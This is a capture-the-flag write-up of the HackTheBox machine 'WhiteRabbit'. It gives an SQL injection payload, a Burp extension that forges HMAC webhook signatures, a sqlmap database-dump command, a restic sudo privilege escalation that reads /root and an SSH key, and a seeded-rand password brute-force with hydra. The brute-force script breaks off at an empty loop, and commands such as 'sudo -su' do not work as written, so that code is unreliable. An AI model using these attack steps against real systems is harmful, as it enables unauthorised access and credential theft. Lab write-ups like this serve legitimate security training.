
**Platform:** Linux  
**IP:** 10.10.11.63  
**Difficulty:** Insane  
**Author:** NoSec  

## Reconnaissance

```bash
22/tcp   open  ssh           OpenSSH 8.9p1 (protocol 2.0)
80/tcp   open  http          Caddy httpd
2222/tcp open  ssh           OpenSSH 8.9p1 (protocol 2.0)
```

Service info: The OS is likely Linux-based, and the Caddy web server is running.

---

## Preparation

- **Edit hosts file**
    ```bash
    sudo nano /etc/hosts
    ```
    ```
    10.10.11.XX     whiterabbit.htb status.whiterabbit.htb
    ```

- **Clock skew fix (if needed)**
    ```bash
    sudo rdate -n whiterabbit.htb
    ```

---

## Subdomain & Web Exploration

**Subdomain discovery:**

By brute-forcing the `/status/` endpoint on `whiterabbit.htb` (e.g., with gobuster or ffuf), I discovered `status.whiterabbit.htb`, which runs Uptime Kuma. A bit more digging (on [redacted URL]) led me to `/status/temp/`, where I found new subdomains:

- GoPhish: `ddb0<link>.whiterabbit.htb`
- Wiki.js: `a668<link>.whiterabbit.htb`

**Webhook investigation:**

The Wiki.js endpoint (on [redacted URL]) revealed a webhook pointing to `28e<link>.whiterabbit.htb`, which looked suspicious.

---

## Exploitation

### SQLi in Webhook

The webhook required an `x-gophish-signature` HMAC signature. I extracted the secret key from:

Source: [redacted URL]  
Key: `3CWV<key>`

I generated the HMAC using CyberChef ([redacted URL]) and tried an SQLi payload:

```bash
{"campaign_id":2,"email":"test \$"","message":"Clicked Link"}
```

I got a MySQL error, confirming the endpoint is vulnerable!

---

### Burp Suite Automation

Manual testing was too slow, so I wrote a Burp extension that automatically adds the HMAC header:

```python
from burp import IBurpExtender, ISessionHandlingAction
from java.io import PrintWriter
from datetime import datetime
import hashlib, hmac

class BurpExtender(IBurpExtender, ISessionHandlingAction):
    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        callbacks.setExtensionName("HMAC Header")
        PrintWriter(callbacks.getStdout(), True).println("HMAC Header OK")
        callbacks.registerSessionHandlingAction(self)
        PrintWriter(callbacks.getStdout(), True).println("Session started")
        return

    def getActionName(self):
        return "HMAC Header"

    def performAction(self, currentRequest, macroItems):
        Secret = "3CWV<redacted>"
        stdout = PrintWriter(self._callbacks.getStdout(), True)
        requestInfo = self._helpers.analyzeRequest(currentRequest)
        BodyBytes = currentRequest.getRequest()[requestInfo.getBodyOffset():]
        BodyStr = self._helpers.bytesToString(BodyBytes)
        _hmac = hmac.new(Secret, BodyStr, digestmod=hashlib.sha256).hexdigest()
        headers = requestInfo.getHeaders()
        headers.add("x-gophish-signature: sha256=" + _hmac)
        message = self._helpers.buildHttpMessage(headers, BodyStr)
        currentRequest.setRequest(message)
        return
```

Installed via Burp's Custom Extensions feature:  
🔗 https://www.pentestpartners.com/security-blog/burp-hmac-header-extensions-a-how-to/

---

### SQLmap Attack

I automated the SQLi attack with sqlmap:

```bash
sqlmap -u [redacted URL] POST --data '{"campaign_id":2,"email":"test@mail.com","message":"Clicked Link"}' -p email --proxy [redacted URL] --batch --dump --Level=5 --risk=3 -D temp -T command_log --flush
```

| ID  | Date                | Command                                                 |
|-----|---------------------|----------------------------------------------------------|
| 103 | 2024-08-30 14:40:41 | `uname -a`                                              |
| 110 | 2024-08-30 15:16:05 | `restic init --repo rest:[redacted URL]`               |

---

## Privilege Escalation

### Exploiting Restic

I found a Restic repository at [redacted URL] with the password: `ygcsv<redacted>`.  
Using it, I created a backup of `/root/`:

```bash
export RESTIC_PASSWORD=ygcsv<pass>
export RESTIC_REPOSITORY=rest:[redacted URL]
sudo /usr/bin/restic init -r .
sudo restic -r . backup /root/
sudo restic -r . dump latest /root/morpheus
```

I extracted an SSH private key for the user `morpheus` and logged in:

```bash
ssh morpheus@whiterabbit.htb -p 22
```

```bash
morpheus@whiterabbit:/home/morpheus# ls
user.txt
```

✅ User flag acquired!

---

### Neo Password Generation

I found a binary at `/opt/neo-password-generator/neopassword-generator` and analyzed it with Ghidra.  
It uses `gettimeofday()` as a seed:

- Seed formula: `tv_sec * 1000 + tv_usec / 1000`
- Then it generates a 20-character password using `rand() % 62`.

Since Neo executed it at `2024-08-30 14:40:42`, I knew the `tv_sec`, but had to bruteforce the microseconds (0–999).  
Here’s a sample Python brute-force script:

```python
from ctypes import CDLL
import datetime
libc = CDLL("libc.so.6")
seconds = datetime.datetime(2024, 8, 30, 14, 40, 42, tzinfo=datetime.timezone.utc).timestamp()
for i in range(0, 1000):
```

Generated passwords were saved:

```bash
python3 password_generator.py > passwords.txt
hydra -l neo -P passwords.txt ssh://whiterabbit.htb -t 20
```

Password found:
```nginx
WB<pass>
```

Once inside via SSH, I just used:

```bash
sudo -su
```

...and boom — got the root flag:

```bash
root@whiterabbit:~# ls
root.txt
```

---

### 🧠 Notes & Reflections – What I learned from this box

- **Webhook & SQLi abuse:** The vulnerabilities in Uptime Kuma were exciting to explore, especially with the custom HMAC handling.  
- **Restic exploitation:** Surprisingly, this backup tool enabled full privilege escalation.  
- **Binary analysis:** Brute-forcing a password generated via `gettimeofday()` required real brainwork.  
- **Automation:** Using Burp Suite and sqlmap saved tons of time, especially dealing with the HMAC headers.

---

### ⚠️ Mistakes, Pitfalls & Tips

- **Watch your clock skew!** If the system time is off, SSH and other steps can fail.  
- **Be patient with brute-force.** It took a while to find the `/status/temp/` endpoint — using the right wordlist matters.  
- **Document without spoilers.** Don’t give everything away so others can still enjoy the challenge.  
- **Double-check everything.** I verified the HMAC key twice before launching sqlmap.

---

### ✅ Summary

WhiteRabbit is a beautifully crafted box — it walks you through solid web exploitation and creative Linux privesc.  
The combination of Uptime Kuma, SQLi, Restic, and binary analysis makes this a real treat for any pentester.

Both flags captured — user and root — so I’m very satisfied. 🚀

---

**Highly recommended** for anyone who enjoys challenges and prefers creative Linux pwns over AD boxes.  
If you’ve got questions — hit me up! 💬
